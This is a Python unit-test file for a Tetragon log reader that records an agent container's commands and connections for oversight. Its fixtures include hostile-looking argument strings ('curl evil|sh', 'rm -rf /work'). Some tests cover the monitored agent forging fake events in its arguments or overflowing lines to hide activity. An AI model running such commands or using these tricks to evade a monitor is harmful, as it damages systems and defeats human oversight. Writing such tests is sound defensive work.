"""Unit tests for backtide/sensors/tetragon.py: the reader of Tetragon's export file.

A real folder stands in for the sensor's ``events/`` and the tests play Tetragon: they append
lines and rotate the file the way it does (T07-1, P9: rename to ``tetragon-<time>.log``, then a
new ``tetragon.log`` with another inode; the oldest are deleted without a trace)."""

import copy
import json
import os
import threading
import time
from collections.abc import Callable
from dataclasses import dataclass, field, replace
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

import pytest

from backtide.blackbox.model import Source
from backtide.sensors import procs
from backtide.sensors.tetragon import ReaderConfig, SensorNotReady, TetragonReader, wait_ready

FIXTURES = Path(__file__).parent / "fixtures" / "tetragon"
TARGET_ID = "4978b4ee592382f24921acfc5822f6f33f7e95e6c89887f80dac399102aa2eff"
OPENCLAW_ID = "cf2e46aad38cd5637c8432bb0b97390b53971cd56bf006c35f92998e26d29188"
WALL = datetime(2026, 10, 17, 9, 46, tzinfo=UTC)  # right after the fixtures were captured


def fixture(name: str) -> dict[str, Any]:
    return json.loads((FIXTURES / f"{name}.json").read_text())


def exec_line(arguments: str, *, binary: str = "/bin/true", pid: int = 1601637) -> str:
    data = copy.deepcopy(fixture("exec_docker_exec"))
    process = data["process_exec"]["process"]
    process.update(arguments=arguments, binary=binary, pid=pid)
    return json.dumps(data)


def raw(name: str) -> str:
    return (FIXTURES / f"{name}.json").read_text().strip()


@dataclass
class Appended:
    source: str
    action: str
    target: str
    details: dict[str, Any]
    risk: int
    snapshot_id: str | None


@dataclass
class Box:
    """Stands in for BlackBox.append."""

    events: list[Appended] = field(default_factory=list)
    fail: bool = False

    def append(
        self,
        source: Source | str,
        action: str,
        target: str,
        *,
        details: Any = None,
        risk: int = 0,
        snapshot_id: str | None = None,
    ) -> object:
        if self.fail:
            raise OSError("disk full")
        self.events.append(
            Appended(str(source), action, target, dict(details or {}), risk, snapshot_id)
        )
        return None

    def of(self, source: str, action: str) -> list[Appended]:
        return [e for e in self.events if (e.source, e.action) == (source, action)]

    def argvs(self) -> list[str]:
        return [e.details["argv"] for e in self.of("exec", "exec")]

    def gaps(self, kind: str | None = None) -> list[dict[str, Any]]:
        return [
            e.details
            for e in self.of("system", "sensor_gap")
            if kind is None or e.details["kind"] == kind
        ]


class Clock:
    def __init__(self) -> None:
        self.now = 1000.0

    def __call__(self) -> float:
        return self.now

    def advance(self, seconds: float) -> None:
        self.now += seconds


class Tetragon:
    """Plays Tetragon on a folder: appends to tetragon.log and rotates it."""

    def __init__(self, events: Path) -> None:
        self.events = events
        self.rotations = 0
        events.mkdir(mode=0o700, exist_ok=True)

    @property
    def log(self) -> Path:
        return self.events / "tetragon.log"

    def write(self, *lines: str, end: str = "\n") -> None:
        with self.log.open("a") as f:
            f.write("".join(line + end for line in lines))

    def write_bytes(self, data: bytes) -> None:
        with self.log.open("ab") as f:
            f.write(data)

    def rotate(self) -> Path:
        self.rotations += 1
        stamp = f"2026-10-17T09-45-{self.rotations:02d}.139"
        rotated = self.events / f"tetragon-{stamp}.log"
        os.rename(self.log, rotated)
        self.log.touch()
        return rotated

    def rotated(self) -> list[Path]:
        return sorted(self.events.glob("tetragon-*.log"))


@pytest.fixture
def tetragon(tmp_path: Path) -> Tetragon:
    return Tetragon(tmp_path / "events")


@pytest.fixture
def box() -> Box:
    return Box()


@pytest.fixture
def clock() -> Clock:
    return Clock()


@pytest.fixture
def make_reader(
    tmp_path: Path, tetragon: Tetragon, box: Box, clock: Clock
) -> Callable[..., TetragonReader]:
    def make(**change: Any) -> TetragonReader:
        agent_id = change.pop("agent_id", TARGET_ID)
        snapshot_for = change.pop("snapshot_for", None)
        wall = change.pop("wall", lambda: WALL)
        already_recorded = change.pop("already_recorded", None)
        stale_probes_before = change.pop("stale_probes_before", None)
        config = ReaderConfig(
            events_dir=tetragon.events,
            cursor_file=tmp_path / "cursor.json",
            agent_name="backtide-agente",
        )
        return TetragonReader(
            replace(config, **change),
            box,
            agent_id=agent_id,
            snapshot_for=snapshot_for,
            already_recorded=already_recorded,
            stale_probes_before=stale_probes_before,
            clock=clock,
            wall=wall,
            sleep=lambda seconds: clock.advance(seconds),
        )

    return make


# --- reading --------------------------------------------------------------------------------


def test_records_the_agents_commands_with_their_container(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    tetragon.write(raw("exec_docker_exec"), raw("exec_init_tree"), raw("exit_signal"))
    reader = make_reader()
    assert reader.poll() == 3
    execs = box.of("exec", "exec")
    assert [e.target for e in execs] == ["/bin/true", "/usr/bin/sleep"]
    assert all(e.details["container"] == TARGET_ID[:12] for e in execs)
    assert all(e.details["container_name"] == "backtide-agente" for e in execs)
    assert [e.target for e in box.of("exec", "exit")] == ["/usr/bin/sh"]


def test_connects_are_recorded_and_loopback_is_counted(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    tetragon.write(raw("connect_tcp4"), raw("connect_tcp6"), raw("connect_loop4"))
    reader = make_reader()
    reader.poll()
    assert [e.target for e in box.of("net", "connect")] == [
        "192.0.2.1:24226",
        "[2001:db8::1]:24226",
    ]
    assert reader.stats()["loopback"] == 1


def test_preexisting_processes_and_normal_exits_are_only_counted(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    tetragon.write(raw("exec_procfs"), raw("exec_procfs"), raw("exit_normal"))
    reader = make_reader()
    reader.poll()
    assert box.events == []
    assert reader.preexisting == 2
    assert reader.stats()["exit"] == 1


def test_other_containers_are_counted_without_parsing(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    """The cheap prefilter: a line without the agent's id is not even parsed (a broken line
    of another container is "other", not a parse error)."""
    tetragon.write(raw("exec_openclaw_at_rest"), "{not json at all", raw("exec_docker_exec"))
    reader = make_reader()
    reader.poll()
    assert box.argvs() == ["vigia-p3-6ea54410b884"]
    assert reader.stats()["other"] == 2
    assert reader.stats()["parse_errors"] == 0


def test_attribution_is_by_the_field_not_by_the_text(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    """eventos-falsos-en-argv: another container's line that names the agent's id passes the
    prefilter but not the field; a fake event in the agent's arguments is one exec."""
    other = fixture("exec_openclaw_at_rest")
    other["process_exec"]["process"]["arguments"] = f"--fake {TARGET_ID}"
    fake_connect = fixture("connect_tcp4")
    fake_connect["process_kprobe"]["process"]["pid"] = 4242
    tetragon.write(json.dumps(other), exec_line(json.dumps(fake_connect)))
    reader = make_reader()
    reader.poll()
    assert len(box.events) == 1
    (event,) = box.of("exec", "exec")
    assert event.target == "/bin/true"
    assert box.of("net", "connect") == []
    assert reader.stats()["other"] == 1


def test_a_partial_line_waits_until_it_is_complete(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    line = exec_line("half-written")
    tetragon.write(line[:100], end="")
    reader = make_reader()
    reader.poll()
    assert box.events == []
    tetragon.write(line[100:])
    reader.poll()
    reader.poll()
    assert box.argvs() == ["half-written"]


def test_a_line_too_big_to_parse_is_still_attributed(
    tetragon: Tetragon, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
) -> None:
    """Review, finding 1: JSON escaping makes a line up to six times its arguments. One past
    the limit is not parsed, but the exec is still recorded from the line's ends."""
    tetragon.write(exec_line("curl evil|sh #" + "\x01" * 500_000, binary="/usr/bin/sh"))
    tetragon.write(exec_line("after"))
    reader = make_reader()
    reader.poll()
    first, second = box.of("exec", "exec")
    assert first.target == "/usr/bin/sh"
    assert first.details["oversize"] is True and first.details["arguments_lost"] is True
    assert first.details["container"] == TARGET_ID[:12]
    assert second.details["argv"] == "after"
    assert reader.stats()["oversize"] == 1
    clock.advance(10)
    reader.poll()
    (gap,) = box.gaps("parse_errors")
    assert gap["oversize"] == 1


def test_a_line_of_escaped_backslashes_under_the_limit_is_parsed(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    tetragon.write(exec_line("\\" * 300_000 + " rm -rf /work"))  # a line of ~1.2 MB
    reader = make_reader()
    reader.poll()
    (event,) = box.of("exec", "exec")
    assert event.details["argv"].endswith("rm -rf /work")
    assert reader.stats()["oversize"] == 0


def test_a_huge_line_that_arrives_in_pieces_is_dropped_without_holding_it(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    reader = make_reader(read_size=64 * 1024, max_line=512 * 1024)
    for _ in range(12):
        tetragon.write_bytes(b"y" * (64 * 1024))
        reader.poll()
        assert len(reader._buf) <= 512 * 1024
    tetragon.write("", exec_line("next"))
    reader.poll()
    assert box.argvs() == ["next"]
    assert reader.stats()["oversize"] == 1


def test_a_line_of_400_kib_is_read(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    """T07-1, P5: an exec with 320 KiB of arguments is a line of 321 KB."""
    tetragon.write(exec_line("z" * (400 * 1024)))
    reader = make_reader()
    reader.poll()
    (event,) = box.of("exec", "exec")
    assert event.details["argv_bytes"] == 400 * 1024
    assert len(event.details["argv"].encode()) <= procs.ARGV_LIMIT


def test_broken_json_is_counted_and_reported(
    tetragon: Tetragon, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
) -> None:
    tetragon.write(
        '{"process_exec": {"process": {"docker": "' + TARGET_ID[:31] + '"',
        f'["{TARGET_ID}"]',
        b"\xff\xfe".decode("latin-1") + TARGET_ID,
        raw("exec_docker_exec"),
    )
    reader = make_reader()
    reader.poll()
    assert reader.stats()["parse_errors"] == 3
    assert len(box.argvs()) == 1
    clock.advance(10)
    reader.poll()
    (gap,) = box.gaps("parse_errors")
    assert gap["count"] == 3
    assert box.of("system", "sensor_gap")[0].risk == 1
    clock.advance(10)
    reader.poll()
    assert len(box.gaps("parse_errors")) == 1  # reported once


def test_without_an_agent_nothing_is_attributed(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    tetragon.write(raw("exec_docker_exec"))
    reader = make_reader(agent_id=None)
    reader.poll()
    assert box.events == [] and reader.stats()["other"] == 1
    reader.set_agent(TARGET_ID)
    tetragon.write(raw("exec_init_tree"))
    reader.poll()
    assert [e.target for e in box.of("exec", "exec")] == ["/usr/bin/sleep"]


def test_a_symlink_is_never_followed(
    tmp_path: Path, tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    planted = tmp_path / "planted.log"
    planted.write_text(raw("exec_docker_exec") + "\n")
    tetragon.log.symlink_to(planted)
    reader = make_reader()
    reader.poll()
    assert box.events == []


def test_the_snapshot_is_asked_with_the_kernels_time(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    asked: list[str | None] = []

    def snapshot_for(t: str | None) -> str | None:
        asked.append(t)
        return "20261017T094500Z-0001"

    tetragon.write(raw("exec_docker_exec"))
    make_reader(snapshot_for=snapshot_for).poll()
    assert asked == ["2026-10-17T09:45:23.220119379Z"]
    assert box.events[0].snapshot_id == "20261017T094500Z-0001"


def test_a_failing_black_box_is_counted_and_the_reader_goes_on(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    tetragon.write(raw("exec_docker_exec"))
    box.fail = True
    reader = make_reader()
    reader.poll()
    assert reader.stats()["lost"] == 1
    box.fail = False
    tetragon.write(raw("exec_init_tree"))
    reader.poll()
    assert [e.target for e in box.of("exec", "exec")] == ["/usr/bin/sleep"]


def test_an_unreadable_folder_is_a_failure_once(
    tmp_path: Path, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
) -> None:
    reader = make_reader(events_dir=tmp_path / "missing")
    reader.poll()
    reader.poll()
    (failed,) = box.of("system", "sensor_failed")
    assert failed.risk == 2 and failed.details["stage"] == "read"


def test_lag_is_warned_at_most_every_ten_minutes(
    tetragon: Tetragon, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
) -> None:
    reader = make_reader(wall=lambda: WALL + timedelta(minutes=5))
    tetragon.write(raw("exec_docker_exec"), raw("exec_init_tree"))
    reader.poll()
    (gap,) = box.gaps("lag")
    assert gap["seconds"] >= 60
    clock.advance(601)
    tetragon.write(raw("exec_init_tree"))
    reader.poll()
    assert len(box.gaps("lag")) == 2


# --- the cursor -----------------------------------------------------------------------------


def test_the_cursor_survives_a_restart_without_losing_or_repeating(
    tmp_path: Path, tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    tetragon.write(exec_line("one"), exec_line("two"))
    first = make_reader()
    first.poll()
    tetragon.write(exec_line("three"), end="")  # half a line: never in the cursor
    first.poll()
    first.save_cursor()
    first.close()
    cursor = tmp_path / "cursor.json"
    assert oct(cursor.stat().st_mode & 0o777) == "0o600"
    tetragon.write("")
    tetragon.write(exec_line("four"))
    second = make_reader()
    second.poll()
    assert box.argvs() == ["one", "two", "three", "four"]


def test_rotation_finishes_the_old_file_first(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    tetragon.write(exec_line("a"), exec_line("b"))
    reader = make_reader()
    reader.poll()
    tetragon.write(exec_line("c"))  # written right before the rotation, not read yet
    tetragon.rotate()
    tetragon.write(exec_line("d"))
    reader.poll()
    assert box.argvs() == ["a", "b", "c", "d"]
    assert box.gaps() == []


def test_rotation_while_stopped_resumes_the_old_file_by_inode(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    tetragon.write(exec_line("a"))
    first = make_reader()
    first.poll()
    first.save_cursor()
    first.close()
    tetragon.write(exec_line("b"))
    tetragon.rotate()
    tetragon.write(exec_line("c"))
    tetragon.rotate()
    tetragon.write(exec_line("d"))
    make_reader().poll()
    assert box.argvs() == ["a", "b", "c", "d"]
    assert box.gaps() == []


def test_a_cursor_whose_file_is_gone_is_a_gap(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    """Rotated away (8 times without being read): sensor_gap, and on from the oldest left."""
    tetragon.write(exec_line("a"))
    first = make_reader()
    first.poll()
    first.save_cursor()
    first.close()
    tetragon.write(exec_line("lost"))
    old = tetragon.rotate()
    tetragon.write(exec_line("kept"))
    tetragon.rotate()
    tetragon.write(exec_line("new"))
    old.unlink()  # the oldest goes first
    make_reader().poll()
    assert box.argvs() == ["a", "kept", "new"]
    (gap,) = box.gaps("rotated")
    assert gap["min_bytes"] >= 0
    assert box.of("system", "sensor_gap")[0].risk == 2


def test_a_reused_inode_is_not_the_cursors_file(
    tmp_path: Path, tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    tetragon.write(exec_line("a"), exec_line("b"))
    first = make_reader()
    first.poll()
    first.save_cursor()
    first.close()
    cursor = json.loads((tmp_path / "cursor.json").read_text())
    # Another file with the same inode number: rewrite the active file in place.
    tetragon.log.write_text(exec_line("other") + "\n" + exec_line("content") + "\n")
    assert os.stat(tetragon.log).st_ino == cursor["inode"]
    make_reader().poll()
    assert box.argvs() == ["a", "b", "other", "content"]
    assert len(box.gaps("rotated")) == 1


def test_a_corrupt_cursor_starts_from_the_oldest_and_says_so(
    tmp_path: Path, tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    (tmp_path / "cursor.json").write_text("{nonsense")
    tetragon.write(exec_line("a"))
    make_reader().poll()
    assert box.argvs() == ["a"]
    (gap,) = box.gaps("cursor_invalid")
    assert "error" in gap


def test_a_rotated_file_deleted_before_it_was_read_is_a_gap(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    tetragon.write(exec_line("a"))
    reader = make_reader(max_bytes_per_poll=1)  # one tiny read per poll: the reader lags
    tetragon.write(exec_line("b"))
    first = tetragon.rotate()
    tetragon.write(exec_line("c"))
    second = tetragon.rotate()
    tetragon.write(exec_line("d"))
    reader.poll()  # reads one byte of the oldest file and learns about the others
    second.unlink()
    for _ in range(5000):
        reader.poll()
    assert first.exists()
    assert box.argvs() == ["a", "b", "d"]
    (gap,) = box.gaps("rotated")
    assert gap["files"] == 1 and gap["min_bytes"] > 0


def test_a_truncated_file_is_read_again_from_the_start(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    tetragon.write(exec_line("a"), exec_line("b"))
    reader = make_reader()
    reader.poll()
    tetragon.log.write_text(exec_line("c") + "\n")
    reader.poll()
    reader.poll()
    assert box.argvs() == ["a", "b", "c"]
    assert len(box.gaps("truncated")) == 1


# --- rate limits ----------------------------------------------------------------------------


def test_a_burst_is_folded_into_one_summary_every_ten_seconds(
    tetragon: Tetragon, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
) -> None:
    reader = make_reader(exec_rate=0.001, exec_burst=3, novel_per_binary=0)
    tetragon.write(*(exec_line(f"n{i}", binary=f"/usr/bin/b{i % 2}") for i in range(10)))
    reader.poll()
    assert box.argvs() == ["n0", "n1", "n2"]
    assert box.of("exec", "summary") == []  # not before 10 s
    clock.advance(10)
    reader.poll()
    (summary,) = box.of("exec", "summary")
    assert summary.target == "agent"
    assert summary.details["folded"] == 7
    assert summary.details["counts"] == {"exec": 7}
    assert {b["binary"]: b["count"] for b in summary.details["top_binaries"]} == {
        "/usr/bin/b1": 4,
        "/usr/bin/b0": 3,
    }
    assert summary.details["top_parents"] == [
        {"binary": "/usr/bin/containerd-shim-runc-v2", "count": 7}
    ]
    assert summary.details["window"]["from"].startswith("2026-10-17T09:45:23")
    clock.advance(10)
    reader.poll()
    assert len(box.of("exec", "summary")) == 1  # nothing new folded


def test_the_summary_carries_the_snapshot_of_the_first_folded_command(
    tetragon: Tetragon, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
) -> None:
    ids = iter(["s1", "s2", "s3", "s4"])
    reader = make_reader(
        exec_rate=0.001, exec_burst=1, snapshot_for=lambda t: next(ids), novel_per_binary=0
    )
    tetragon.write(exec_line("a"), exec_line("b"), exec_line("c"))
    reader.poll()
    clock.advance(10)
    reader.poll()
    assert box.of("exec", "summary")[0].snapshot_id == "s2"


def test_connects_have_their_own_bucket(
    tetragon: Tetragon, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
) -> None:
    reader = make_reader(
        exec_rate=0.001, exec_burst=1, net_rate=0.001, net_burst=2, novel_per_binary=0
    )
    tetragon.write(
        exec_line("a"),
        exec_line("b"),
        raw("connect_tcp4"),
        raw("connect_tcp6"),
        raw("connect_udp4"),
    )
    reader.poll()
    assert box.argvs() == ["a"]
    assert len(box.of("net", "connect")) == 2
    clock.advance(10)
    reader.poll()
    (net_summary,) = box.of("net", "summary")
    assert net_summary.details["folded"] == 1
    assert net_summary.details["top_targets"] == [{"target": "192.0.2.1:24226", "count": 1}]


def test_the_daily_budget_leaves_only_summaries_and_one_warning(
    tetragon: Tetragon, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
) -> None:
    reader = make_reader(exec_daily=2, novel_per_binary=0)
    tetragon.write(*(exec_line(f"n{i}") for i in range(5)))
    reader.poll()
    tetragon.write(exec_line("later"))
    clock.advance(10)
    reader.poll()
    assert box.argvs() == ["n0", "n1"]
    (warning,) = box.gaps("budget")
    assert warning["class"] == "exec"
    budget_gaps = [e for e in box.of("system", "sensor_gap") if e.details["kind"] == "budget"]
    assert [e.risk for e in budget_gaps] == [2]  # the review: risk 2
    assert reader.exhausted_budgets() == ["exec"]
    assert box.of("exec", "summary")[0].details["folded"] == 4
    clock.advance(24 * 3600)
    tetragon.write(exec_line("next day"))
    reader.poll()
    assert box.argvs()[-1] == "next day"


def test_stop_writes_the_last_summary(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    reader = make_reader(exec_rate=0.001, exec_burst=1, novel_per_binary=0)
    tetragon.write(exec_line("a"), exec_line("b"))
    reader.poll()
    reader.stop()
    assert box.of("exec", "summary")[0].details["folded"] == 1


# --- throttle -------------------------------------------------------------------------------


def test_throttle_becomes_a_gap_with_its_window(
    tetragon: Tetragon, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
) -> None:
    reader = make_reader()
    tetragon.write(raw("throttle_start"))
    reader.poll()
    clock.advance(10)
    tetragon.write(raw("throttle_stop"))
    reader.poll()
    start, stop = box.gaps("throttle")
    assert start == {
        "kind": "throttle",
        "state": "start",
        "since": "2026-10-17T09:45:40.166022589Z",
    }
    assert stop["state"] == "stop"
    assert stop["since"] == "2026-10-17T09:45:40.166022589Z"
    assert stop["until"] == "2026-10-17T09:45:45.509600984Z"


def test_another_containers_throttle_is_not_the_agents(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    tetragon.write(raw("throttle_start"))
    make_reader(agent_id=OPENCLAW_ID).poll()
    assert box.events == []


# --- probes: readiness and heartbeat --------------------------------------------------------


def test_an_expected_probe_is_consumed_once_and_never_recorded(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    reader = make_reader()
    nonce = procs.new_nonce("hb")
    reader.expect(nonce)
    tetragon.write(exec_line(nonce))
    reader.poll()
    assert reader.seen(nonce)
    assert box.events == []
    tetragon.write(exec_line(nonce))  # the same nonce again: not expected any more
    reader.poll()
    assert box.argvs() == [nonce]


def test_an_unexpected_probe_is_recorded(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    reader = make_reader()
    nonce = procs.new_nonce("hb")
    tetragon.write(exec_line(nonce))
    reader.poll()
    assert box.argvs() == [nonce] and not reader.seen(nonce)


def test_expected_probes_expire(
    tetragon: Tetragon, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
) -> None:
    reader = make_reader()
    nonce = procs.new_nonce("hb")
    reader.expect(nonce)
    clock.advance(121)
    tetragon.write(exec_line(nonce))
    reader.poll()
    assert box.argvs() == [nonce]


def test_expect_refuses_anything_but_a_nonce(make_reader: Callable[..., TetragonReader]) -> None:
    with pytest.raises(ValueError):
        make_reader().expect("init")


def test_wait_ready_returns_once_the_probe_is_seen(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    reader = make_reader()
    launched: list[str] = []

    def launch(nonce: str) -> None:
        launched.append(nonce)
        if len(launched) == 3:  # the sensor "gets ready" at the third probe
            tetragon.write(exec_line(nonce))

    elapsed = wait_ready(reader, launch, timeout=30.0, interval=1.0)
    assert len(launched) == 3 and 0 <= elapsed <= 30.0
    assert box.events == []


def test_a_late_probe_still_counts(
    tetragon: Tetragon, make_reader: Callable[..., TetragonReader]
) -> None:
    reader = make_reader()
    launched: list[str] = []

    def launch(nonce: str) -> None:
        launched.append(nonce)
        if len(launched) == 2:
            tetragon.write(exec_line(launched[0]))  # the first probe shows up late

    wait_ready(reader, launch, timeout=30.0, interval=1.0)
    assert len(launched) == 2


def test_wait_ready_gives_up_after_its_timeout(
    clock: Clock, make_reader: Callable[..., TetragonReader]
) -> None:
    reader = make_reader()
    start = clock.now
    with pytest.raises(SensorNotReady):
        wait_ready(reader, lambda nonce: None, timeout=30.0, interval=1.0)
    assert 30.0 <= clock.now - start < 32.0


# --- the thread ------------------------------------------------------------------------------


def test_the_thread_reads_and_stop_saves_the_cursor(tmp_path: Path, tetragon: Tetragon) -> None:
    box = Box()
    config = ReaderConfig(
        events_dir=tetragon.events,
        cursor_file=tmp_path / "cursor.json",
        agent_name="backtide-agente",
        poll_interval=0.01,
    )
    reader = TetragonReader(config, box, agent_id=TARGET_ID, wall=lambda: WALL)
    reader.start()
    try:
        tetragon.write(exec_line("threaded"))
        deadline = time.monotonic() + 5
        while not box.events and time.monotonic() < deadline:
            time.sleep(0.01)
    finally:
        reader.stop()
    assert box.argvs() == ["threaded"]
    cursor = json.loads((tmp_path / "cursor.json").read_text())
    assert cursor["offset"] == tetragon.log.stat().st_size
    assert not [t for t in threading.enumerate() if t.name == "tetragon-reader"]


# --- review fixes ---------------------------------------------------------------------------


def test_a_reused_inode_of_a_file_already_read_is_read_again(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    """Review, finding 2: on ext4 or XFS a deleted rotated file's inode comes back at once as
    the new tetragon.log. Played here by turning the old file into the new active one."""
    tetragon.write(exec_line("a"))
    old = tetragon.rotate()
    tetragon.write(exec_line("b"))
    reader = make_reader()
    reader.poll()
    assert box.argvs() == ["a", "b"]
    middle = tetragon.rotate()
    old.write_text("")  # the oldest is deleted, and its inode is the new active file
    os.rename(old, tetragon.log)
    tetragon.write(exec_line("c"))
    reader.poll()
    reader.poll()
    assert middle.exists()
    assert box.argvs() == ["a", "b", "c"]


def test_a_waiting_file_whose_inode_got_new_content_is_a_gap(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    tetragon.write(exec_line("a"))
    waiting = None
    reader = make_reader(max_bytes_per_poll=1)
    tetragon.rotate()
    tetragon.write(exec_line("b"))
    waiting = tetragon.rotate()
    tetragon.write(exec_line("c"))
    reader.poll()  # on the oldest; the other two are waiting
    waiting.write_text(exec_line("replaced") + "\n")  # same inode, other file
    for _ in range(5000):
        reader.poll()
    (gap,) = box.gaps("rotated")
    assert gap["files"] == 1
    assert box.argvs() == ["a", "replaced", "c"]


def test_lines_of_the_replaced_container_are_still_the_agents(
    tetragon: Tetragon, box: Box, clock: Clock, make_reader: Callable[..., TetragonReader]
) -> None:
    """Review, finding 5: the reader lags, the container is created again; its old lines
    still unread are not lost."""
    tetragon.write(raw("exec_docker_exec"))
    reader = make_reader()
    reader.set_agent(OPENCLAW_ID)
    tetragon.write(raw("exec_openclaw_at_rest"))
    reader.poll()
    assert [e.details["container"] for e in box.of("exec", "exec")] == [
        TARGET_ID[:12],
        OPENCLAW_ID[:12],
    ]
    clock.advance(601)
    tetragon.write(raw("exec_init_tree"))
    reader.poll()
    assert len(box.of("exec", "exec")) == 2
    assert reader.stats()["other"] == 1


def _procfs(start_time: str) -> str:
    data = fixture("exec_procfs")
    data["process_exec"]["process"]["start_time"] = start_time
    return json.dumps(data)


def test_processes_begun_while_the_sensor_was_down_are_recorded(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    """Review, finding 6: after a restart of the sensor, procFS lines of processes that began
    after the last event seen are recorded (marked preexisting); older ones only counted."""
    tetragon.write(raw("exec_docker_exec"))  # the last event before the sensor went down
    tetragon.write(_procfs("2026-10-17T09:45:21.717563404Z"), _procfs("2026-10-17T09:50:00Z"))
    reader = make_reader()
    reader.poll()
    execs = box.of("exec", "exec")
    assert len(execs) == 2
    assert execs[1].details["preexisting"] is True
    assert execs[1].details["started"] == "2026-10-17T09:50:00Z"
    assert reader.preexisting == 2


def test_preexisting_processes_after_a_restart_of_backtide_use_the_cursors_time(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    tetragon.write(raw("exec_docker_exec"))
    first = make_reader()
    first.poll()
    first.save_cursor()
    first.close()
    tetragon.write(_procfs("2026-10-17T09:50:00Z"))
    make_reader().poll()
    assert [e.details.get("preexisting") for e in box.of("exec", "exec")] == [None, True]


# --- a kill -9 of the service: read again, recorded once (T07-3) ------------------------------


def _keyed_exec(n: int, *, time_: str = "2026-10-17T09:45:23.220119379Z") -> str:
    """An exec of the agent with its own exec_id (the real ones are unique per process)."""
    data = copy.deepcopy(fixture("exec_docker_exec"))
    data["process_exec"]["process"].update(arguments=f"cmd-{n}", exec_id=f"ZXhlY2lk{n:08d}")
    data["time"] = time_
    return json.dumps(data)


def _recorded_keys(box: Box) -> Callable[[str | None], list[str]]:
    """What the service hands the reader: the keys of the sensor events in the black box."""

    def keys(since: str | None) -> list[str]:
        found = [procs.event_key(e.action, e.details) for e in box.events]
        return [key for key in found if key is not None]

    return keys


def test_after_a_kill_the_lines_read_again_are_not_recorded_twice(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    """The cursor is saved every 5 s: a kill -9 of the service repeats what came after it."""
    tetragon.write(_keyed_exec(1), _keyed_exec(2))
    first = make_reader()
    first.poll()
    first.save_cursor()
    tetragon.write(_keyed_exec(3), _keyed_exec(4))
    first.poll()  # recorded, but killed before the next cursor
    first.close()
    tetragon.write(_keyed_exec(5))  # while the service was down
    second = make_reader(already_recorded=_recorded_keys(box))
    second.poll()
    assert box.argvs() == ["cmd-1", "cmd-2", "cmd-3", "cmd-4", "cmd-5"]
    assert second.stats()["duplicates"] == 2


def test_the_reader_asks_for_the_keys_since_the_cursors_time(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    asked: list[str | None] = []

    def keys(since: str | None) -> list[str]:
        asked.append(since)
        return []

    tetragon.write(_keyed_exec(1, time_="2026-10-17T09:45:30.5Z"))
    make_reader(already_recorded=keys).poll()  # no cursor yet: everything is a candidate
    first = make_reader()
    first.poll()
    first.save_cursor()
    make_reader(already_recorded=keys).poll()
    assert asked == [None, "2026-10-17T09:45:30.5Z"]


def test_a_failing_lookup_never_loses_an_event(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    def broken(since: str | None) -> list[str]:
        raise OSError("the black box is busy")

    tetragon.write(_keyed_exec(1))
    reader = make_reader(already_recorded=broken)
    reader.poll()
    assert box.argvs() == ["cmd-1"]
    (failed,) = box.of("system", "sensor_failed")
    assert failed.details["stage"] == "dedupe"


def test_a_key_seen_again_after_the_replay_is_recorded(
    tetragon: Tetragon, box: Box, make_reader: Callable[..., TetragonReader]
) -> None:
    """Each key in the black box stands for one line: it is skipped once, not forever."""
    tetragon.write(_keyed_exec(1))
    make_reader().poll()
    tetragon.write(_keyed_exec(1))  # Tetragon would never repeat an exec_id; still recorded
    reader = make_reader(already_recorded=_recorded_keys(box))
    reader.poll()
    assert box.argvs() == ["cmd-1", "cmd-1"]
    assert reader.stats()["duplicates"] == 1


